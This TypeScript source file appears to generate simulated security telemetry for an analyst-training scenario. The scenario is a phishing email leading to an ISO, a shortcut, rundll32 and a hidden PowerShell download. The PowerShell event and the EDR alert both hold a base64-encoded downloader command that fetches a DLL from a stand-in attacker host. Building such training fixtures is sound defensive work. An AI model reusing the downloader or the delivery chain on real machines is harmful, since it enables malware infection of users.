/**
 * Events-only half of the ./isoContainerSmuggling.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./isoContainerSmuggling.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { fgWeb } from "@/lib/sim/emitters/fortigate";
import { csFile, csProcess, csAlert, csDns, csNetwork } from "@/lib/sim/emitters/crowdstrike";
import { mailDelivered, mailClick, zoneStream } from "./corroboratingTelemetry.events";

/** Telemetry half of `buildIsoContainerSmugglingScenario`: the events and the story title, no answer key. */
export function isoContainerSmugglingScenarioEvents() {
  const B = new Date("2026-04-14T10:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-5528", ip: "10.14.33.91" };
  const victim = { email: "n.katz@nexacorp.com", name: "Noa Katz", sam: "n.katz" };

  const shareSite = "invoice-doc-share.net";
  const c2 = "cdn-update-relay.net";

  const isoHash = makeSha256("invoice_84421_iso_container_smuggling_2026");
  const payloadHash = makeSha256("cdn_update_relay_core_dll_payload_2026");

  // EDR↔scenario integration (Phase 4): one incident. Endpoint-primary → edr_scope
  // "edr" (the firewall download/fetch are transport evidence). The Falcon
  // DetectionSummaryEvent is the alert that opens the ticket; the critical
  // encoded-PowerShell detection is the behavioural crux.
  const INCIDENT = "inc:ics:1";

  const cxN = "nexacorp" as const;
  const ctxN = { companyId: cxN, host: host.hostname, srcIp: host.ip, user: victim.email, incidentId: INCIDENT };
  const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
  const PS_PATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const lureUrl = `https://${shareSite}/invoice/84421`;

  // Sysmon Event 15 (FileCreateStreamHash): the Zone.Identifier alternate data stream Windows writes on a download
  // (ZoneId=3, Internet) and the copy it propagates to every file inside the mounted container.
  const zoneContents = `[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=${lureUrl}\r\nHostUrl=https://${shareSite}/dl/Invoice_84421.iso\r\n`;
  const stream = (id: string, ms: number, target: string, image: string, _imageName: string, pid: number, description: string): TelemetryEvent =>
    zoneStream({ id, ts: T(ms), incidentId: INCIDENT, host: host.hostname, user: victim.email, userDomainName: "NEXACORP\\n.katz",
      target, image, pid, contents: zoneContents, description });

  const events: TelemetryEvent[] = [
    // -1. Delivery: the mail gateway delivers the lure and records the click.
    mailDelivered({
      id: "evt_ics_00a_lure_delivered", ts: T(-7 * MIN), incidentId: INCIDENT,
      user: victim.email, userTitle: "Accounts Payable Clerk", qid: "7D13E0A4B2",
      sender: "billing@invoice-doc-share.net", headerFrom: "\"Accounts Receivable\" <billing@invoice-doc-share.net>",
      subject: "Overdue invoice 84421", messageId: "<5b2f71c0-9ad4-4e63-b1f7-3c0a18e2d654@invoice-doc-share.net>",
      senderIp: "193.106.191.58", url: lureUrl, domain: shareSite,
      urlRewritten: "https://urldefense.proofpoint.com/v2/url?u=https-3A__invoice-2Ddoc-2Dshare.net_invoice_84421",
      spf: "pass", dkim: "none", dmarc: "none", phishScore: 38, spamScore: 14, mitre: "T1566.002", tactic: "Initial Access",
      description: "A mail titled Overdue invoice 84421 was delivered to n.katz with a link to invoice-doc-share.net.",
    }),
    mailClick({
      id: "evt_ics_00b_lure_click", ts: T(-92_000), incidentId: INCIDENT,
      user: victim.email, userTitle: "Accounts Payable Clerk", qid: "7D13E0A4B2", sender: "billing@invoice-doc-share.net",
      messageId: "<5b2f71c0-9ad4-4e63-b1f7-3c0a18e2d654@invoice-doc-share.net>",
      url: lureUrl, domain: shareSite, clickIp: "217.177.80.10",
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      description: "URL Defense recorded n.katz following the rewritten link from the Overdue invoice 84421 mail; click status permitted.",
    }),
    csDns({
      ...ctxN, id: "evt_ics_00c_dns_lure", ts: T(-91_000), severity: "low",
      domain: shareSite, resolvedIp: "104.21.61.90",
      processName: "chrome.exe", pid: 6204, processPath: CHROME_PATH, parentName: "explorer.exe", parentPid: 3184,
      description: "chrome.exe on LAP-5528 resolved invoice-doc-share.net.",
    }),
    // 0. Delivery, she opened the link in a phishing email; the browser loads the lure page.
    fgWeb({
      companyId: cxN, id: "evt_ics_00_lure_click", ts: T(-90_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INCIDENT, severity: "low",
      subtype: "webfilter", eventtype: "ftgd_allow", action: "passthrough", logid: "0317013312", level: "notice",
      msg: "URL belongs to an allowed category in policy", category: "Newly Registered Domain", categoryId: "91",
      url: lureUrl, domain: shareSite, remoteIp: "104.21.61.90",
      bytesIn: 18_204, policyId: 14, mitre: "T1566.002", tactic: "Initial Access",
      description: "LAP-5528 opened https://invoice-doc-share.net/invoice/84421 at 10:03:30 (the link from a phishing email), passed through under Newly Registered Domain (cat 91).",
    }),
    // 1. The download. An ISO, not an executable - FortiGate's file-filter logs it (not a block).
    fgWeb({
      companyId: cxN, id: "evt_ics_01_download", ts: T(0), host: host.hostname, srcIp: host.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INCIDENT, severity: "low",
      subtype: "filefilter", eventtype: "filefilter", action: "log-only", logid: "0211008192", level: "warning",
      msg: "File filter event", category: "Newly Registered Domain", categoryId: "91",
      url: `https://${shareSite}/dl/Invoice_84421.iso`, domain: shareSite, remoteIp: "104.21.61.90",
      bytesIn: 7_129_088, file: { name: "Invoice_84421.iso", sha256: isoHash, size: 7_129_088, type: "iso" }, policyId: 14,
      description: "LAP-5528 downloaded Invoice_84421.iso, 6.8 MB, from invoice-doc-share.net at 10:05, logged by the file-filter profile as log-only.",
    }),
    // 2. The ISO lands, carrying a Mark-of-the-Web tag (Zone.Identifier ZoneId=3, Internet).
    csFile({
      companyId: cxN, id: "evt_ics_02_file_write", ts: T(6_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso", sha256: isoHash, size: 7_129_088, action: "file_create",
      actorProcess: "chrome.exe", actorPid: 6204, actorPath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      severity: "low", incidentId: INCIDENT,
      description: "chrome.exe wrote C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso at 10:05:06, tagged with a Zone.Identifier alternate data stream (ZoneId=3, Internet), the Mark-of-the-Web Windows applies to anything downloaded from the web.",
    }),
    // 2b. The Mark-of-the-Web itself, as Sysmon records the Zone.Identifier stream on the downloaded ISO.
    stream("evt_ics_02b_zone_iso", 7_000, "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso:Zone.Identifier", CHROME_PATH, "chrome.exe", 6204,
      "Sysmon Event 15: chrome.exe created the Zone.Identifier stream (ZoneId=3) on C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso."),
    // 3. She double-clicks it, explorer.exe mounts the ISO as drive D:\ (FileOpenInfo).
    //    Since the Nov-2022 patch (CVE-2022-41091) Windows propagates the ISO's MotW to the
    //    files inside the mounted volume, so update.dat and the .lnk are themselves tagged.
    csFile({
      companyId: cxN, id: "evt_ics_03_mount", ts: T(4 * MIN + 20_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso", sha256: isoHash, action: "file_access",
      actorProcess: "explorer.exe", actorPid: 3184, actorPath: "C:\\Windows\\explorer.exe", actorIntegrity: "medium",
      mitre: "T1204.002", tactic: "Execution", severity: "medium", incidentId: INCIDENT,
      description: "At 10:09:20 explorer.exe opened Invoice_84421.iso. Windows' container-mount handler presented it as drive D:\\, exposing Invoice_84421.lnk and update.dat, both now carrying the propagated Mark-of-the-Web.",
    }),
    // 3b. The mounted volume appears and the Mark-of-the-Web is copied onto its files (the propagation the first question rests on).
    stream("evt_ics_03b_zone_lnk", 4 * MIN + 21_000, "D:\\Invoice_84421.lnk:Zone.Identifier", "System", "System", 4,
      "Sysmon Event 15: the Zone.Identifier stream (ZoneId=3) was created on D:\\Invoice_84421.lnk, inside the mounted ISO."),
    stream("evt_ics_03c_zone_dat", 4 * MIN + 21_500, "D:\\update.dat:Zone.Identifier", "System", "System", 4,
      "Sysmon Event 15: the Zone.Identifier stream (ZoneId=3) was created on D:\\update.dat, inside the mounted ISO."),
    csFile({
      ...ctxN, id: "evt_ics_03d_lnk_open", ts: T(4 * MIN + 33_000), path: "D:\\Invoice_84421.lnk", sha256: makeSha256("invoice_84421_lnk_shortcut_2026"), action: "file_access",
      actorProcess: "explorer.exe", actorPid: 3184, actorPath: "C:\\Windows\\explorer.exe", severity: "medium",
      description: "explorer.exe opened D:\\Invoice_84421.lnk at 10:09:33.",
    }),
    // 4. THE EVENT THAT MATTERS, the .lnk targets a signed LOLBin (rundll32) to load the
    //    bundled update.dat. A Mark-of-the-Web .lnk shows a SmartScreen/Open-File warning;
    //    the user clicked through it (T1204.002), and SmartScreen does not re-gate a trusted
    //    signed Windows binary once it runs.
    csProcess({
      companyId: cxN, id: "evt_ics_04_lnk_cmd", ts: T(4 * MIN + 34_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
      cmdline: "rundll32.exe D:\\update.dat,Start",
      parentName: "explorer.exe", parentPid: 3184, pid: 6620, signed: true,
      mitre: "T1218.011", tactic: "Stealth", severity: "high", incidentId: INCIDENT,
      description: "Fourteen seconds later she opened Invoice_84421.lnk on D:\\. Windows showed the Open File - Security Warning for the Mark-of-the-Web .lnk; she chose Run anyway, and the shortcut ran rundll32.exe against D:\\update.dat, the data file bundled in the ISO.",
    }),
    csFile({
      ...ctxN, id: "evt_ics_04b_dat_open", ts: T(4 * MIN + 34_500), path: "D:\\update.dat", sha256: makeSha256("update_dat_bundled_loader_2026"), action: "file_access",
      actorProcess: "rundll32.exe", actorPid: 6620, actorPath: "C:\\Windows\\System32\\rundll32.exe", actorParentName: "explorer.exe", actorParentPid: 3184, severity: "medium",
      description: "rundll32.exe opened D:\\update.dat at 10:09:34.5.",
    }),
    // 5. THE CRUX, the loaded update.dat spawns a hidden, encoded PowerShell (alert-grade).
    csProcess({
      companyId: cxN, id: "evt_ics_05_powershell", ts: T(4 * MIN + 35_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -NoP -W Hidden -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcgBlAGwAYQB5AC4AbgBlAHQALwBtAG8AZAAvAGMAbwByAGUALgBkAGwAbAAnACwAJwBDADoAXABVAHMAZQByAHMAXABuAC4AawBhAHQAegBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAYwBvAHIAZQAuAGQAbABsACcAKQA=",
      parentName: "rundll32.exe", parentPid: 6620, pid: 6631, isDetection: true,
      mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INCIDENT,
      description: "One second later rundll32.exe (hosting update.dat) spawned powershell.exe with a hidden window and a base64-encoded command.",
    }),
    // 6. The decoded command fetches the follow-on payload, passed through as Uncategorized.
    fgWeb({
      companyId: cxN, id: "evt_ics_06_payload_fetch", ts: T(4 * MIN + 37_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      incidentId: INCIDENT, severity: "critical",
      subtype: "webfilter", eventtype: "ftgd_allow", action: "passthrough", logid: "0317013312", level: "notice",
      msg: "URL belongs to an allowed category in policy", category: "Unrated", categoryId: "0",
      url: `https://${c2}/mod/core.dll`, domain: c2, remoteIp: "193.106.191.42", bytesIn: 2_516_582,
      file: { name: "core.dll", sha256: payloadHash, size: 2_516_582, type: "dll" }, policyId: 22,
      description: "Two seconds after PowerShell started, LAP-5528 fetched core.dll, 2.4 MB, from cdn-update-relay.net, a domain with no relationship to invoice-doc-share.net, passed through as an unrated URL (cat 0).",
    }),
    csDns({
      ...ctxN, id: "evt_ics_05b_dns_c2", ts: T(4 * MIN + 36_000), severity: "medium",
      domain: c2, resolvedIp: "193.106.191.42",
      processName: "powershell.exe", pid: 6631, processPath: PS_PATH, parentName: "rundll32.exe", parentPid: 6620,
      description: "powershell.exe on LAP-5528 resolved cdn-update-relay.net.",
    }),
    csNetwork({
      ...ctxN, id: "evt_ics_05c_connect_c2", ts: T(4 * MIN + 36_800), severity: "high",
      remoteIp: "193.106.191.42", remotePort: 443, application: "tls", domain: c2,
      processName: "powershell.exe", pid: 6631, processPath: PS_PATH, parentName: "rundll32.exe", parentPid: 6620,
      description: "powershell.exe on LAP-5528 connected to 193.106.191.42:443.",
    }),
    // 7. It lands on disk, unsigned, written by the interpreter.
    csFile({
      companyId: cxN, id: "evt_ics_07_payload_write", ts: T(4 * MIN + 39_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\AppData\\Roaming\\core.dll", sha256: payloadHash, size: 2_516_582, action: "file_create", signed: false,
      actorProcess: "powershell.exe", actorPid: 6631, actorPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      severity: "high", incidentId: INCIDENT,
      description: "powershell.exe wrote C:\\Users\\n.katz\\AppData\\Roaming\\core.dll, unsigned, 2.4 MB.",
    }),
    // 8. Falcon catches up and kills the interpreter before core.dll loads (the ticket-opener).
    {
      ...csAlert({
        companyId: cxN, id: "evt_ics_08_edr_alert", ts: T(4 * MIN + 45_000), host: host.hostname, srcIp: host.ip, user: victim.email,
        threatName: "ContainerLnkRundll32SpawnedEncodedPowerShell", severity: "critical",
        detail: "A shortcut on a mounted ISO/IMG volume ran rundll32 against a bundled data file, which spawned PowerShell with a hidden window and an encoded download command.",
        mitre: "T1059.001", tactic: "Execution", technique: "Command and Scripting Interpreter: PowerShell",
        processTree: "explorer.exe > rundll32.exe > powershell.exe", action: "killed", incidentId: INCIDENT,
        processName: "powershell.exe", processPath: PS_PATH, pid: 6631, parentPath: "C:\\Windows\\System32\\rundll32.exe",
        cmdline: "powershell.exe -NoP -W Hidden -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcgBlAGwAYQB5AC4AbgBlAHQALwBtAG8AZAAvAGMAbwByAGUALgBkAGwAbAAnACwAJwBDADoAXABVAHMAZQByAHMAXABuAC4AawBhAHQAegBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAYwBvAHIAZQAuAGQAbABsACcAKQA=",
        description: "Falcon raised a Critical detection on LAP-5528 for the explorer -> rundll32 -> powershell chain originating from a mounted ISO volume, and killed the PowerShell process before core.dll could be loaded.",
      }),
      edr_scope: "edr",
    },
  ];

  // Story order: the log is read oldest-first.
  events.sort((a, b) => a.ts.localeCompare(b.ts));

  // The lure click arrives from the webmail page (FortiGate logs it as a referral); Falcon's real disposition string.
  for (const e of events) {
    if (e.id === "evt_ics_00_lure_click" && e.raw) e.raw["data.referralurl"] = "https://outlook.office.com/";
    if (e.raw?.["crowdstrike.PatternDispositionDescription"] === "Detection, Process Killed") e.raw["crowdstrike.PatternDispositionDescription"] = "Prevention, process killed.";
  }

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Critical EDR detection after an overdue invoice email", events, T, MIN, host, shareSite, c2, isoHash, payloadHash };
}
